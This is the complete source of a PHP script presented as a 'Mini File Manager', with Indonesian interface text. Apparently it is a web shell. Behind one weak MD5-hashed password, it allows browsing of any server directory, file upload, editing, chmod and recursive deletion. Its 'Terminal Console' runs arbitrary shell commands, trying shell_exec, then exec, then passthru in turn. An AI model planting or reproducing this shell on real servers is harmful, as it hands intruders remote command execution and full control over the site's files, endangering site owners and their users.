<?php
session_start();

// Hash MD5 dari '@'
$password_hash = 'c6a20bcf3ef78a1541ad23598cb295c8';

// Logout
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    unset($_SESSION['logged_in']);
    header('Location: ' . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

// Login
$error = '';
if (isset($_POST['password'])) {
    if (md5($_POST['password']) === $password_hash) {
        $_SESSION['logged_in'] = true;
        header('Location: ' . $_SERVER['REQUEST_URI']);
        exit;
    } else {
        $error = 'Password salah!';
    }
}

if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Login - Mini File Manager</title>
    <style>
        body { font-family: sans-serif; background: #1e1e2e; color: #cdd6f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #313244; padding: 25px 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); width: 320px; text-align: center; }
        input[type="password"] { width: 100%; padding: 10px; margin: 12px 0; border: 1px solid #45475a; background: #1e1e2e; color: #fff; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #89b4fa; color: #11111b; border: none; font-weight: bold; border-radius: 4px; cursor: pointer; }
        button:hover { background: #b4befe; }
        .error { color: #f38ba8; font-size: 14px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h3>Mini FM Login</h3>
        <?php if ($error): ?><div class="error"><?= $error ?></div><?php endif; ?>
        <form method="POST">
            <input type="password" name="password" placeholder="Masukkan Password" required autofocus>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
<?php
    exit;
}

// --- LOGIKA UTAMA FILE MANAGER --- //

$dir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
$dir = realpath($dir);
if (!$dir || !is_dir($dir)) {
    $dir = __DIR__;
}
$dir = str_replace('\\', '/', $dir);

$msg = '';

// Helper Hapus Folder Non-Empty
function delete_dir($dirPath) {
    if (!is_dir($dirPath)) return false;
    if (substr($dirPath, -1) != '/') $dirPath .= '/';
    $files = glob($dirPath . '*', GLOB_MARK);
    foreach ($files as $file) {
        if (is_dir($file)) delete_dir($file);
        else unlink($file);
    }
    return rmdir($dirPath);
}

// 1. Fitur Mass Delete (Centang & Hapus)
if (isset($_POST['bulk_delete']) && isset($_POST['selected_items']) && is_array($_POST['selected_items'])) {
    $count = 0;
    foreach ($_POST['selected_items'] as $item) {
        $target_item = $dir . '/' . basename($item);
        if (is_dir($target_item)) {
            if (delete_dir($target_item)) $count++;
        } elseif (is_file($target_item)) {
            if (unlink($target_item)) $count++;
        }
    }
    $msg = "$count item berhasil dihapus!";
}

// 2. Fitur Single Delete via URL
if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['item'])) {
    $target_item = $dir . '/' . basename($_GET['item']);
    if (is_dir($target_item)) {
        if (delete_dir($target_item)) $msg = "Folder berhasil dihapus!";
        else $msg = "Gagal menghapus folder.";
    } elseif (is_file($target_item)) {
        if (unlink($target_item)) $msg = "File berhasil dihapus!";
        else $msg = "Gagal menghapus file.";
    }
}

// 3. Fitur Upload
if (isset($_FILES['upload_file'])) {
    $target = $dir . '/' . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        $msg = "File berhasil diunggah!";
    } else {
        $msg = "Gagal mengunggah file.";
    }
}

// 4. Fitur Save File
if (isset($_POST['save_file']) && isset($_POST['filename'])) {
    $file_path = $dir . '/' . basename($_POST['filename']);
    if (file_put_contents($file_path, $_POST['file_content']) !== false) {
        $msg = "File berhasil disimpan!";
    } else {
        $msg = "Gagal menyimpan file.";
    }
}

// 5. Fitur Chmod
if (isset($_POST['chmod_action']) && isset($_POST['chmod_target'])) {
    $target_item = $dir . '/' . basename($_POST['chmod_target']);
    $permissions = octdec($_POST['chmod_value']);
    if (chmod($target_item, $permissions)) {
        $msg = "Izin (Chmod) berhasil diperbarui!";
    } else {
        $msg = "Gagal mengubah izin (Chmod).";
    }
}

// Mode Edit File
$edit_mode = false;
$edit_filename = '';
$edit_content = '';
if (isset($_GET['action']) && $_GET['action'] === 'edit' && isset($_GET['file'])) {
    $file_path = $dir . '/' . basename($_GET['file']);
    if (is_file($file_path)) {
        $edit_mode = true;
        $edit_filename = $_GET['file'];
        $edit_content = htmlspecialchars(file_get_contents($file_path));
    }
}

// Execute Terminal Output
$cmd_output = '';
if (isset($_POST['cmd_input'])) {
    $command = $_POST['cmd_input'];
    chdir($dir);
    if (function_exists('shell_exec')) {
        $cmd_output = shell_exec($command . ' 2>&1');
    } elseif (function_exists('exec')) {
        exec($command . ' 2>&1', $out);
        $cmd_output = implode("\n", $out);
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($command);
        $cmd_output = ob_get_clean();
    } else {
        $cmd_output = "Fungsi eksekusi perintah dinonaktifkan di server ini.";
    }
}

$items = array_diff(scandir($dir), array('.', '..'));
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Mini File Manager</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #1e1e2e; color: #cdd6f4; margin: 20px; }
        a { color: #89b4fa; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .container { background: #181825; padding: 20px; border-radius: 8px; border: 1px solid #313244; }
        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #45475a; padding-bottom: 10px; margin-bottom: 15px; }
        .path-bar { display: flex; gap: 5px; margin-bottom: 15px; }
        .path-bar input[type="text"], .cmd-input { flex: 1; padding: 8px; background: #313244; color: #fff; border: 1px solid #45475a; border-radius: 4px; font-family: inherit; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #313244; font-size: 14px; }
        th { background: #313244; color: #a6adc8; }
        .btn { background: #a6e3a1; color: #11111b; padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; text-decoration: none; display: inline-block; }
        .btn-danger { background: #f38ba8; color: #11111b; }
        .btn-warn { background: #fab387; color: #11111b; }
        .alert { background: #313244; color: #a6e3a1; padding: 10px; border-radius: 4px; margin-bottom: 15px; border-left: 4px solid #a6e3a1; }
        textarea { width: 100%; height: 350px; background: #11111b; color: #a6e3a1; font-family: monospace; border: 1px solid #45475a; border-radius: 4px; padding: 10px; box-sizing: border-box; }
        .terminal-box { background: #11111b; border: 1px solid #45475a; border-radius: 4px; padding: 10px; margin-top: 20px; }
        .terminal-out { background: #1e1e2e; color: #89b4fa; padding: 10px; margin-top: 10px; white-space: pre-wrap; font-size: 13px; max-height: 250px; overflow-y: auto; border: 1px solid #313244; }
        .inline-form { display: inline; }
        .inline-form input[type="text"] { width: 50px; background: #313244; color: #fff; border: 1px solid #45475a; padding: 2px 4px; text-align: center; border-radius: 3px; }
        input[type="checkbox"] { cursor: pointer; transform: scale(1.2); }
    </style>
    <script>
        function toggleAll(source) {
            checkboxes = document.getElementsByName('selected_items[]');
            for(var i=0, n=checkboxes.length; i<n; i++) {
                checkboxes[i].checked = source.checked;
            }
        }
    </script>
</head>
<body>

<div class="container">
    <div class="header">
        <h2>Mini File Manager</h2>
        <a href="?action=logout" class="btn btn-danger">Logout</a>
    </div>

    <?php if ($msg): ?>
        <div class="alert"><?= htmlspecialchars($msg) ?></div>
    <?php endif; ?>

    <!-- Jump Directory -->
    <form method="GET" class="path-bar">
        <label style="line-height: 35px; font-weight: bold;">Current Dir:</label>
        <input type="text" name="dir" value="<?= htmlspecialchars($dir) ?>" required>
        <button type="submit" class="btn">Go</button>
    </form>

    <?php if ($edit_mode): ?>
        <!-- Mode Edit File -->
        <h3>Editing: <?= htmlspecialchars($edit_filename) ?></h3>
        <form method="POST" action="?dir=<?= urlencode($dir) ?>">
            <input type="hidden" name="filename" value="<?= htmlspecialchars($edit_filename) ?>">
            <textarea name="file_content"><?= $edit_content ?></textarea><br><br>
            <button type="submit" name="save_file" class="btn">Simpan File</button>
            <a href="?dir=<?= urlencode($dir) ?>" class="btn btn-danger">Batal</a>
        </form>
    <?php else: ?>
        <!-- Form Upload -->
        <form method="POST" enctype="multipart/form-data" style="margin-bottom: 15px;">
            <input type="file" name="upload_file" required style="color: #fff;">
            <button type="submit" class="btn">Upload File</button>
        </form>

        <!-- Form Mass Delete & Tabel File -->
        <form method="POST" action="?dir=<?= urlencode($dir) ?>" onsubmit="return confirm('Yakin ingin menghapus item yang dicentang?');">
            <table>
                <thead>
                    <tr>
                        <th style="width: 30px;"><input type="checkbox" onclick="toggleAll(this)"></th>
                        <th>Nama</th>
                        <th>Tipe</th>
                        <th>Ukuran</th>
                        <th>Tanggal Diubah</th>
                        <th>Izin (Chmod)</th>
                        <th>Aksi</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td></td>
                        <td colspan="6"><a href="?dir=<?= urlencode(dirname($dir)) ?>">📁 .. (Up Directory)</a></td>
                    </tr>
                    <?php foreach ($items as $item): 
                        $full_path = $dir . '/' . $item;
                        $is_dir = is_dir($full_path);
                        $file_perms = substr(sprintf('%o', fileperms($full_path)), -4);
                        $file_time = date("Y-m-d H:i:s", filemtime($full_path));
                    ?>
                    <tr>
                        <td><input type="checkbox" name="selected_items[]" value="<?= htmlspecialchars($item) ?>"></td>
                        <td>
                            <?php if ($is_dir): ?>
                                <a href="?dir=<?= urlencode($full_path) ?>">📁 <?= htmlspecialchars($item) ?></a>
                            <?php else: ?>
                                📄 <?= htmlspecialchars($item) ?>
                            <?php endif; ?>
                        </td>
                        <td><?= $is_dir ? 'Folder' : 'File' ?></td>
                        <td><?= $is_dir ? '-' : number_format(filesize($full_path)) . ' B' ?></td>
                        <td><?= $file_time ?></td>
                        <td>
                            <input type="hidden" name="chmod_target" value="<?= htmlspecialchars($item) ?>">
                            <span style="color: #fab387; font-weight: bold;"><?= $file_perms ?></span>
                        </td>
                        <td>
                            <?php if (!$is_dir): ?>
                                <a href="?dir=<?= urlencode($dir) ?>&action=edit&file=<?= urlencode($item) ?>" class="btn btn-warn" style="padding: 2px 6px; font-size: 12px;">Edit</a>
                            <?php endif; ?>
                            <a href="?dir=<?= urlencode($dir) ?>&action=delete&item=<?= urlencode($item) ?>" onclick="return confirm('Yakin menghapus <?= htmlspecialchars($item) ?>?');" class="btn btn-danger" style="padding: 2px 6px; font-size: 12px;">Delete</a>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>

            <div style="margin-top: 15px;">
                <button type="submit" name="bulk_delete" class="btn btn-danger">🗑️ Hapus yang Dicentang</button>
            </div>
        </form>

        <!-- Mini Terminal / Command Execution -->
        <div class="terminal-box">
            <h4 style="margin-top: 0; color: #89b4fa;">Terminal Console</h4>
            <form method="POST" action="?dir=<?= urlencode($dir) ?>">
                <div style="display: flex; gap: 5px;">
                    <input type="text" name="cmd_input" class="cmd-input" placeholder="Masukkan perintah shell (misal: ls -la, whoami, pwd)..." required>
                    <button type="submit" class="btn">Execute</button>
                </div>
            </form>
            <?php if ($cmd_output !== ''): ?>
                <div class="terminal-out"><?= htmlspecialchars($cmd_output) ?></div>
            <?php endif; ?>
        </div>
    <?php endif; ?>
</div>

</body>
</html>